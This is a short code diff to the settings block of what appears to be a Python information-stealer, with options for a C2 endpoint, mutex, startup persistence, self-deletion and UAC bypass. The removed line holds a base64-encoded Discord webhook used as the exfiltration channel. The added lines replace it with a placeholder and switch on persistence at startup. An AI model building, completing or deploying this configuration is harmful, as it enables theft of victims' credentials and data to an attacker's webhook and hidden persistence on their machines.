@@ -21,11 +21,11 @@ from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warni
 disable_warnings_urllib3()
 
 class Settings:
-    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIwNzA2NDY1NjQwMTkzMjM0OC9IMFNQUmFjMzZaZUl6eU1vREVTU2kzTHJ4d1lzQ3p6Q3VsdmhMcTVmTFIwSUdYYmdKZEZrbjNWYXVWdkFCRm1INXB0UA==').decode())
+    C2 = ("WEBHOOK_HERE")
     Mutex = base64.b64decode('NW4xMlNnWjdMd3lpOG11cg==').decode()
     PingMe = bool('true')
     Vmprotect = bool('')
-    Startup = bool('')
+    Startup = bool('True')
     Melt = bool('')
     UacBypass = bool('')
     ArchivePassword = base64.b64decode('MTIz').decode()
